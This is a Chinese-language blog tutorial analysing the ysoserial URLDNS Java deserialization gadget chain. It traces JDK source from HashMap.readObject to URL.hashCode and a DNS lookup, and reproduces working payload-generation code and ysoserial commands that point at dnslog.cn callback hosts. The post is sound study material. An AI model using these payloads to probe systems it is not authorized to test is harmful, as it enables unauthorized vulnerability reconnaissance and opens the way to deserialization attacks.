学习java反序列化自然绕不开cc链，ysoserial。ysoserial中最简单的链条就属urldns，用来作为入门学习很不错，下面简单分析，跟一下流程。

## 0x01 利用链

```java
HashMap->readObject()
HashMap->hash()
URL->hashCode()
URLStreamHandler->hashCode()
URLStreamHandler->getHostAddress()
InetAddress->getByName()
```

依此跟进分析：

### java.util.HashMap#readObjectr():

```java
private void readObject(java.io.ObjectInputStream s)
        throws IOException, ClassNotFoundException {
        // Read in the threshold (ignored), loadfactor, and any hidden stuff
        s.defaultReadObject();
        reinitialize();
        if (loadFactor <= 0 || Float.isNaN(loadFactor))
            throw new InvalidObjectException("Illegal load factor: " +
                                             loadFactor);
        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0)
            throw new InvalidObjectException("Illegal mappings count: " +
                                             mappings);
        else if (mappings > 0) { // (if zero, use defaults)
            // Size the table using given load factor only if within
            // range of 0.25...4.0
            float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
            float fc = (float)mappings / lf + 1.0f;
            int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (fc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)fc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);

            // Check Map.Entry[].class since it's the nearest public type to
            // what we're actually creating.
            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);
            @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
```

其中最后一行putVal()调用了hash(key)。跟进hash()

### java.util.HashMap#hash():

```java
    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
```

其中key.hashCode()获取了传入对象的hashCode()。

转到

### java.net.URL#hashCode():

```java
    public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
```

url对象的hashCode()，当hashCode参数=-1时，调用handler.hashCode()

继续跟进

### java.net.URLStreamHandler#hashCode():

```java
protected int hashCode(URL u) {
        int h = 0;

        // Generate the protocol part.
        String protocol = u.getProtocol();
        if (protocol != null)
            h += protocol.hashCode();

        // Generate the host part.
        InetAddress addr = getHostAddress(u);
        if (addr != null) {
            h += addr.hashCode();
        } else {
            String host = u.getHost();
            if (host != null)
                h += host.toLowerCase().hashCode();
        }

        // Generate the file part.
        String file = u.getFile();
        if (file != null)
            h += file.hashCode();

        // Generate the port part.
        if (u.getPort() == -1)
            h += getDefaultPort();
        else
            h += u.getPort();

        // Generate the ref part.
        String ref = u.getRef();
        if (ref != null)
            h += ref.hashCode();

        return h;
    }
```

其中重点关注InetAddress addr = getHostAddress(u);

获取传入url的ip，跟进

### java.net.URLStreamHandler#getHostAddress():

```java
protected synchronized InetAddress getHostAddress(URL u) {
        if (u.hostAddress != null)
            return u.hostAddress;

        String host = u.getHost();
        if (host == null || host.equals("")) {
            return null;
        } else {
            try {
                u.hostAddress = InetAddress.getByName(host);
            } catch (UnknownHostException ex) {
                return null;
            } catch (SecurityException se) {
                return null;
            }
        }
        return u.hostAddress;
    }
```

其中 u.hostAddress = InetAddress.getByName(host);

getByName(host)进行了一次dns查询，达到该利用链的目的，发起dns查询判断序列化点是否存在序列化漏洞。



该链条第一次跟着这样看完可能当场懵逼，不都还在HashMap类吗？怎么就跳到了URL类，这两个类怎么联系在一起的？

我们不妨反过来看一下这个链条：

## 0x02 反向理解urldns利用链

经过上面的分析我们确定

URL类的hashCode()方法会调用-->

URLStreamHandler类的hashCode()调用-->

URLStreamHandler类的getHostAddress()-->

getHostAddress方法中调用了InetAddress.getByName(host);此处造成了dns查询。



所以我们想要利用该dns查询链条，就需要找到一个地方调用url.hashCode()。

而java.util.HashMap#hash():中

![2.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/反序列化URLDNS/2.1.png)

只要key键值为一个url对象即可触发url.hashCode()。

而java.util.HashMap#readObject()方法中就调用了Hash()方法。

![2.2](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/反序列化URLDNS/2.2.png)
_posts/JAVA安全
所以可以大致梳理一遍流程就是：

HashMap->readObject()
HashMap->hash()
URL->hashCode()
URLStreamHandler->hashCode()
URLStreamHandler->getHostAddress()
InetAddress->getByName()

## 0x03 php序列化和java序列化的思考对比

这里也发现了java序列化函数和php的不同点。php 通过 unserailize() 触发__ wakeup 、 __sleep 等魔法函数，实现反序列化调用危险函数的目的。

而java中大量的库会实现 readObject 、 writeObject 方法。开发者通过重写readObject()，writeObject()来达到序列化的目的，所以很多类库中都存在重写的序列化函数。用得多自然也增大了序列化攻击的风险。



php反序列化漏洞和java反序列化在寻找利用链这点上有异曲同工之妙，但是也存在很大的不同。

java因为一些基本类库中就存在反序列化利用链条，所以基本只要能够控制反序列化输入流即可造成反序列化漏洞。

而php的序列化除了框架层面的链条，没有那么多通用的链条可以反序列化利用。这就造成了php没有java那么多的序列化漏洞吧。



## 0x04 payload构造

```java
package com.company;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {
    public static void main(String[] args) throws Exception {
        //0x01.生成payload
        //设置一个hashMap
        HashMap<URL, String> hashMap = new HashMap<URL, String>();
        //设置我们可以接受DNS查询的地址
        URL url = new URL("http://z2iif2.dnslog.cn");
        //将URL的hashCode字段设置为允许修改
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        //**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**
        //1. 设置url的hashCode字段为0xdeadbeef（随意的值）
        f.set(url, 0xdeadbeef);
        //2. 将url放入hashMap中，右边参数随便写
        hashMap.put(url, "rmb122");
        //修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）
        f.set(url, -1);
        //0x02.写入文件模拟网络传输
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
        oos.writeObject(hashMap);
        //0x03.读取文件，进行反序列化触发payload
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("out.bin"));
        ois.readObject();
    }
}
```

大体来分析payload构造流程，

`Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");`

getDeclaredField获取一个类本身（不包括父类）所有属性，  f.setAccessible(true);将字段设置为允许修改。

其中：

```java
f.set(url, 0xdeadbeef);
hashMap.put(url, "rmb122");
f.set(url, -1);
```

这里操作比较蜜汁，先将url的hashcode设为0xdeadbeef，执行put将url对象添加到散列表。

然后在设为-1。根据前面的分析，只有url.hashCode=-1时，才能执行dns请求。

这里这样写的原因是因为put添加数据时也会调用putVal()，此处和readObject()函数是一样的

![4.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/反序列化URLDNS/4.1.png)

readObject()-->putVal:

![4.2](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/反序列化URLDNS/4.2.png)

会进行dns请求。这样会导致在payload构造时本地主机即会请求一次dnslog。可能对后面利用dnslog检测反序列化漏洞造成干扰。

所以在put时先将url.hashCode设置为-1以外的值。put添加数据之后再还原回-1。至于为啥是-1。是因为java.net.URL#hashCode()的逻辑判断：

![4.3](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/反序列化URLDNS/4.3.png)



## 0x05 ysoserial利用链分析

上面用到的方法和ysoserial的方法还是有区别的，我们来看看ysoserial是如何生成payload的

```java
package ysoserial.payloads;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 * A blog post with more details about this gadget chain is at the url below:
 *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 *
 *   This was inspired by  Philippe Arteau @h3xstream, who wrote a blog
 *   posting describing how he modified the Java Commons Collections gadget
 *   in ysoserial to open a URL. This takes the same idea, but eliminates
 *   the dependency on Commons Collections and does a DNS lookup with just
 *   standard JDK classes.
 *
 *   The Java URL class has an interesting property on its equals and
 *   hashCode methods. The URL class will, as a side effect, do a DNS lookup
 *   during a comparison (either equals or hashCode).
 *
 *   As part of deserialization, HashMap calls hashCode on each key that it
 *   deserializes, so using a Java URL object as a serialized key allows
 *   it to trigger a DNS lookup.
 *
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 *
 *
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies()
@Authors({ Authors.GEBL })
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

        /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}

```

ysoserial实现了一个SilentURLStreamHandler类，并重写了InetAddress.getHostAddress()方法，使其返回null。这样生成payload时调用到此处直接返回null，并不会进行dns请求。

但是此处存在一个疑问，ysoserial重写了InetAddress.getHostAddress()让其放回null，那么我们反序列化还怎么让它进行dns请求呢？

主要看这里。

```java
 //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
```

ysoserial做了解释`Since the field <code>java.net.URL.handler</code> is transient`    handler是瞬态的。

进入URL类查看handler属性，handler之前有一个transient关键字。

![5.2](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/反序列化URLDNS/5.2.png)

transient关键字介绍：
![5.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/反序列化URLDNS/5.1.png)

所以handler属性在序列化时并被序列化。这样在进行反序列化时handler为默认的URLStreamHandler类属性，继续执行URLStreamHandler类里的InetAddress.getHostAddress()方法。

```
java -agentlib:jdwp=transport=dt_socket,server=n,address=LAPTOP-50N17D1J:5005,suspend=y  -jar  ysoserial-0.0.6-SNAPSHOT-all.jar


java -agentlib:jdwp=transport=dt_socket,server=n,address=10.45.9.48:5005,suspend=y -jar  ysoserial-0.0.6-SNAPSHOT-all.jar
```



## 0x06 ysoserial调试

ysoserial可以idea起端口，ysoserial链接进行调试。

1. 首先在建立一个远程调试端口：
   ![6.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/反序列化URLDNS/6.1.png)

2. 点击debug进入监听状态
3. terminal输入ysoserial启动语句(不同版本可能不一样，可以直接复制command line argument for remote JVM 去掉<>两个参数，根据实际需求修改)

```java
java -agentlib:jdwp=transport=dt_socket,server=n,address=10.45.9.48:5005,suspend=y -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://maazpy.dnslog.cn"
```

![6.2](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/反序列化URLDNS/6.2.png)

生成payload时执行到SilentURLStreamHandler的getHostAddress()方法返回null，就不会产生dns请求。

## 0x07 参考

p神知识星球-反序列化系列（1-3）

[JAVA反序列化-ysoserial-URLDNS](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/反序列化URLDNS/https://www.anquanke.com/post/id/201762)

[Java反序列化-URLDNS](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/反序列化URLDNS/http://wjlshare.com/archives/1493)

